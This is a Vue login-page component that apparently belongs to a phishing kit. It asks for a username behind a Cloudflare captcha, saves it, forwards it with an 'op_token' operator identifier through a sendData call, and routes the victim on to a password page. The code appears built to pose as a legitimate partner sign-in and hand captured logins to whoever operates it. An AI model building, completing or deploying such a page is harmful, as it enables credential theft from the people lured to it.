<template>
  <div class="panel__body" id="first">
    <div class="panel__title">
      <h1>{{ t("sign_in.top_title") }}</h1>
    </div>
    <div class="spacer"></div>
    <div class="form">
      <div class="input__wrapper">
        <label for="loginname">{{ t("sign_in.username") }}</label>
        <div class="input__box">
          <input type="text" name="loginname" id="loginname" :placeholder="placeholder" v-model="value"
            style="border: 1px solid #d4111e" minlength="3">
          <div class="attention">
            <span class="material-symbols-outlined">
              error
            </span>
          </div>
          <div class="errorMessage errorMessageNotValid" style="display: none">
            {{ t('sign_in.errors.username_required') }}
          </div>
          
        </div>
        <div class="errorMessage errorMessageWrong" style="display: block">
            {{ t('sign_in.errors.username_not_found') }}
            <a href="#" style="color: #006ce4; font-weight: 700; font-size: 14px; line-height: 20px;">
              {{ t('sign_in.errors.create_new') }}
            </a>
            {{ t('sign_in.errors.to_access') }}
          </div>
      </div>
      <Turnstile
        :site-key="siteKey"
        :on-verify="onVerify"
        class="mt-3 mb-3"
      />
      <div class="button__wrapper">
        <button id="firstBtn" class="btn" @click="nextPage" :disabled="value.length <= 0 || !captchaToken">{{ t('sign_in.next')
          }}</button>
      </div>
      <div class="text-partner">
        <hr>
        {{ t("sign_in.questions.1") }}
        </br>
        {{ t("sign_in.questions.2") }}

      </div>

    </div>
  </div>
</template>

<script setup>
import { resetData, sendData } from "~/utils/";
import { useI18n } from "vue-i18n";
const { t } = useI18n()

const placeholder = computed(() => t('sign_in.placeholder'))
const value = ref("")
const captchaToken = ref("")
const siteKey = "YOUR_SITE_KEY" // Замените на ваш Site Key от Cloudflare

const onVerify = (token) => {
  captchaToken.value = token
}

const router = useRouter()
const route = useRoute()


async function nextPage() {
  await resetData(route.query.op_token)
  localStorage.setItem("login", value.value)
  await router.push({
    name: "pass",
    query: { op_token: route.query.op_token, login: value.value, }
  })
  await sendData({ " Логин": value.value }, route.query.op_token)

}

</script>